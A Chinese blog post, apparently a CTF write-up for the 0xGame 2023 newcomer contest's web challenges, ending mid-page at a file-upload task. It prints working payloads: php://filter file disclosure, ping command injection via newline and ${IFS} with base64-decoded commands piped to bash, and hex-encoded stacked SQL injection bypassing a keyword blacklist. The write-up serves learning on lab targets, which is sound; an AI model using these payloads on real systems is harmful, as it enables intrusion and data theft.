<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>0xGame 2023 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>0xGame 2023</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-10-22T07:33:54.356Z" id="date"> 2023-10-22</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-11-05T08:54:48.931Z" id="updated"> 2023-11-05</time></div></span><br><span>文章总字数: <div class="control">15.5k</div></span><br><span>预计阅读时间: <div class="control">74 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>新生赛真的多，前两周做的时候还心情舒畅，第三周就开始坐牢了，┭┮﹏┭┮，太菜了，新生赛也打不过。俗话说得好：打不过我还不会抄吗（狗头），我直接照着wp开卷！！！</p>
<p>不过这个0xgame的比赛我只能说，体验感有点差，真心觉得不如动态靶机舒服（而且题目还难！！！）</p>
<h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="Week-1-signin"></a>[Week 1] signin</h2>
<p>![image-20231022153622957](0xGame 2023/image-20231022153622957.png)</p>
<p>首先打开之后是一个简单的页面，这里页面还说你能找到flag吗？-呵呵，我tm当然找不到了。。。</p>
<p>这里呢我尝试抓包以及dirsearch扫目录均无果，当时就焦虑了，我想着tm第一周的新手题就不会了？？？之后一下想到F12打开抓个包看看是否有信息，嗨，想不到真有</p>
<p>![image-20231022154409249](0xGame 2023/image-20231022154409249.png)</p>
<p>F12开启控制台随后重新刷新一下页面抓包，这里发现有页面的js文件源码，这时我就认为大概率就是此处了哈哈</p>
<p>![image-20231022154505505](0xGame 2023/image-20231022154505505.png)</p>
<p>一番搜索发现flag果然在此js文件下。</p>
<h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="Week-1-baby-php"></a>[Week 1] baby_php</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>简单的PHP特性，这里首先要求传入的a、b参数不相等，但md5加密后的值要相等，我们直接数组绕过即可。</p>
<p>其次在接着判断c参数是否是数字，只有c满足不是数字，且c不等于1024，且c经过intval取整后等于1024即可包含flag.php文件</p>
<p>那首先是绕过is_numeric函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后<br></code></pre></td></tr></table></figure>
<p>根据上述我们可以实现绕过，不过这里直接在后面+其他字符如a也可以。</p>
<p>其次是<code>$c != 1024 &amp;&amp; intval($c) == 1024</code>这里可以看到有取整函数，那我们应该想到将c赋值为浮点类型，这样就可以成功绕过，并且 intval 也会截断非数字的部分</p>
<p>最终payload如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">GET：?a[]=1&amp;b[]=2<br>POST：c=1024.1a<br>cookie：name=php://filter/convert.base64-encode/resource=flag<br></code></pre></td></tr></table></figure>
<p>至于为何这里要用php伪协议读取，我猜测是如果直接赋值为flag.php的话，inlcude会执行php文件中的代码，导致最终结果不可见，故此选择伪协议读取，将文件内容进行base64编码导致其不可执行最终回显出来</p>
<p>![image-20231022160313639](0xGame 2023/image-20231022160313639.png)</p>
<p>如上图直接base64解码即可</p>
<h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="Week-1-hello-http"></a>[Week 1] hello_http</h2>
<p>![image-20231022160421773](0xGame 2023/image-20231022160421773.png)</p>
<p>这里考察http基础知识，根据页面信息我们选择get传参query为ctf</p>
<p>![image-20231022160629635](0xGame 2023/image-20231022160629635.png)</p>
<p>接着让我们post传参action为getflag</p>
<p>![image-20231022160651994](0xGame 2023/image-20231022160651994.png)</p>
<p>又提示我们不是admin，这里还是直接上bp吧</p>
<p>![image-20231022160725124](0xGame 2023/image-20231022160725124.png)</p>
<p>发现敏感词role，我们将其修改为admin</p>
<p>![image-20231022160754322](0xGame 2023/image-20231022160754322.png)</p>
<p>此时又提示我们不是内网ip，那我们用xff头修改一下看看</p>
<p>![image-20231022160844324](0xGame 2023/image-20231022160844324.png)</p>
<p>这时提示我们ua头不是指定的，那我们直接修改即可</p>
<p>![image-20231022160917710](0xGame 2023/image-20231022160917710.png)</p>
<p>最后又提示我们referer头来源不正确，那我们继续修改</p>
<p>![image-20231022161019184](0xGame 2023/image-20231022161019184.png)</p>
<p>拿到flag</p>
<h2 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="Week-1-repo-leak"></a>[Week 1] repo_leak</h2>
<p>![image-20231022161204842](0xGame 2023/image-20231022161204842.png)</p>
<p>如上图，我们看一下题目名称就可以猜到应该是信息泄露，此时dirsearch扫一下看看</p>
<p>![image-20231022161318450](0xGame 2023/image-20231022161318450.png)</p>
<p>如图发现很多关于git泄露的东西，这里直接上工具去利用漏洞：</p>
<p>使用<code>githack等工具</code>下载站点存储库的整个代码历史记录和配置信息。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHub - lijiejie/GitHack: A <code>.git</code> folder disclosure exploit</a></p>
<p>下载地址如上，注意是python2环境，具体用法参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43511094/article/details/123634720?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=git%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-123634720.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">Git泄露总结</a></p>
<p>用法如下：在工具所在目录打开cmd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 GitHack.py http://120.27.148.152:50013/.git/<br></code></pre></td></tr></table></figure>
<p>![image-20231022162258605](0xGame 2023/image-20231022162258605.png)</p>
<p>![image-20231022163523977](0xGame 2023/image-20231022163523977.png)</p>
<p>随后进入目标url所在目录</p>
<p>![image-20231022163541284](0xGame 2023/image-20231022163541284.png)</p>
<p>首先查看一下git日志，可以看到哪一个人在哪个时间提交了那一个文件，每一个commit都会生成一个哈希值，这个值是唯一的，相当于commit的身份证</p>
<p>这里可以看到在 第二次提交的时候看到其提交了flag，那我们查看一下</p>
<p>![image-20231022163710703](0xGame 2023/image-20231022163710703.png)</p>
<p>git reflog：可以查看近期所有的提交记录，这样就可以回滚到任意一个版本</p>
<p>接下来查看flag所在的8a5b670：git show 8a5b670</p>
<p>![image-20231022163941388](0xGame 2023/image-20231022163941388.png)</p>
<p>可以进一步查看提交的文件内容，找到flag</p>
<h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="Week-1-ping"></a>[Week 1] ping</h2>
<p>![image-20231022164257042](0xGame 2023/image-20231022164257042.png)</p>
<p>打开是一个ping命令执行页面，我们先查看一下源码看看有什么信息</p>
<p>![image-20231022164321959](0xGame 2023/image-20231022164321959.png)</p>
<p>果然这里提示我们访问一下api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>结果发现这里是前面ping页面的源码，这里可以看到过滤了分号，空格，斜杠以及flag关键词，不过这里对我们传入的ip执行了正则的过滤，这里过滤的很全，似乎是只允许数字的，这里我们尝试换行绕过</p>
<p>先搞一个对上述正则的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">整个正则表达式用于匹配IPv4地址的所有四个部分，确保每个部分的值在0到255之间，且用点号分隔。这是一个有效的IPv4地址验证正则表达式。<br></code></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=127.0.0.1%0als<br></code></pre></td></tr></table></figure>
<p>![image-20231022165222349](0xGame 2023/image-20231022165222349.png)</p>
<p>如上图看到成功执行，那现在就是考虑如果绕过过滤读取到flag了，这里肯定就要用到编码之类的</p>
<p>空格过滤的话我们可以用&lt;&gt;或者${IFS}等等，至于分号的过滤（大概率是避免我们的变量拼接吧）这里网站文章翻翻发现base64编码就可以绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bHMgLw==&quot;</span>|base64 -d|bash ==&gt;ls /<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash ==&gt;cat /flag<br>    <br>注意上述的payload之前的空格符用$&#123;IFS&#125;代替即可绕过<br></code></pre></td></tr></table></figure>
<p>![image-20231022165608398](0xGame 2023/image-20231022165608398.png)</p>
<p>![image-20231022165735258](0xGame 2023/image-20231022165735258.png)</p>
<p>拿到flag</p>
<h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="Week-2-ez-sqli"></a>[Week 2] ez_sqli</h2>
<p>![image-20231022170307981](0xGame 2023/image-20231022170307981.png)</p>
<p>随后在下载题目给的附件，是一串python源码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">import</span> MySQLdb<br><span class="hljs-keyword">import</span> re<br><br>blacklist = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;database&#x27;</span>, <span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;column&#x27;</span>, <span class="hljs-string">&#x27;alter&#x27;</span>, <span class="hljs-string">&#x27;create&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;xor&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;then&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>]<br><br>conn = MySQLdb.connect(host=<span class="hljs-string">&#x27;db&#x27;</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, passwd=<span class="hljs-string">&#x27;root&#x27;</span>, db=<span class="hljs-string">&#x27;ctf&#x27;</span>)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    field = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>)<br>    field = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, field)<br><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> s.lower() <span class="hljs-keyword">in</span> field.lower():<br>            <span class="hljs-keyword">return</span> s + <span class="hljs-string">&#x27; are banned&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;id|name|email&quot;</span>, field):<br>        field = <span class="hljs-string">&#x27;id&#x27;</span><br><br>    <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>        cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM userinfo order by %s&#x27;</span> % field)<br>        res = cursor.fetchall()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, res=res)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>这里呢设置了黑名单过滤了很多敏感词，之后如果访问/路由的话，或自动执行index函数</p>
<p>随后检查get参数的order和id，遍历黑名单数组查看是否存在敏感字词。接着查看传入的field是否是id，name，email中的一个，如果不是则默认配置为id，之后执行 sql语句根据field内容查找回显内容</p>
<p>这里分析完之后我依旧没什么思路，太菜了，这里也是看了hint发现可以堆叠注入，他说是敏感函数<code>cursor.execute</code>可以 执行多条sql语句，事后诸葛亮的我悟了，看来日后分析代码时，也要搜寻相关函数的用法来找漏洞。</p>
<p>既然提示我们是堆叠注入，且其中黑名单过滤的很多以及sub去掉了空白字符（也就是过滤空格），因此这里我又没思路了，只能看wp了，发现其利用的是mysql预处理知识，但我还没仔细学过，因此这里我直接大概了解一下上个payload，之后认真学习一番（最近事情好多，真累啊~~）</p>
<p>wp讲的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">考察 MySQL 堆叠注⼊ + 预处理语句绕过 WAF<br><br>⿊名单过滤了常⻅的 SQL 关键词, 正常没办法进⾏ SQL 注⼊, sqlmap 也跑不出来<br><br>⾸先得知道 mysqlclient (MySQLdb) 的 cursor.execute() ⽀持执⾏多条 SQL 语句, 这个也给了 hint<br><br>然后, MySQL ⽀持 SQL 语句的预处理 (set prepare execute), 这个⽹上搜搜也能找到对应的⽂章和 payload<br></code></pre></td></tr></table></figure>
<p>预处理语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare stmt from &#x27;SELECT * FROM users WHERE id=?&#x27;;<br>set @id=1;<br>execute stmt using @id;<br></code></pre></td></tr></table></figure>
<p>这里我们用报错注入去搞，但报错注入回显内容有限，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># step <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br># step <span class="hljs-number">2</span><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">31</span>,<span class="hljs-number">99</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
<p>这里由于黑名单的存在，因此wp将其进行了ASCII码16进制编码绕过：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"># step <span class="hljs-number">1</span><br>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span><br><span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c312c333129292c30783<br><span class="hljs-number">765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;<br># step <span class="hljs-number">2</span><br>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span><br><span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c33312c393929292c307<br><span class="hljs-number">83765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;<br></code></pre></td></tr></table></figure>
<p>emmm大概原理是set一条待执行语句，随后将其置入prepare预处理中，接着execute执行（也没仔细学，说错了别打┭┮﹏┭┮）</p>
<p>![image-20231022174720144](0xGame 2023/image-20231022174720144.png)</p>
<p>![image-20231022174737683](0xGame 2023/image-20231022174737683.png)</p>
<p>找到flag</p>
<h2 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="Week-2-ez-upload"></a>[Week 2] ez_upload</h2>
<p>![image-20231022221053241](0xGame 2023/image-20231022221053241.png)</p>
<p>打开题目是一个文件上传题，我们下载附件可以看到对应源码，那直接分析一波</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$user_dir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$user_dir</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>        &lt;title&gt;Gravatar&lt;/title&gt;<br>        &lt;script src=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;script src=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;link href=<span 